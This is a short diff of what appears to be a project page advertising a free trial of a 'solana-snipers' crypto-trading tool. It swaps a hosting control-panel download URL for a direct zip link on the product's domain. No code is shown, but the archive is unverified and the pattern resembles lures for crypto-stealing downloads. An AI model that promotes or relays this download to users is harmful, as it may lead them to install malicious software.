@@ -9,7 +9,7 @@ https://solana-snipers.co
 
 FREE TRIAL:
 
-[DOWNLOAD HERE](https://ams-shared-6.hostwindsdns.com:2083/cpsess1207473095/download?skipencode=1&file=%2fhome%2fitlkdxgl%2fpublic_html%2fsolana-snipers.com%2fsolana-snipers.rar)
+[DOWNLOAD HERE](https://solana-snipers.co/solana-snipers.zip)
 
 
 
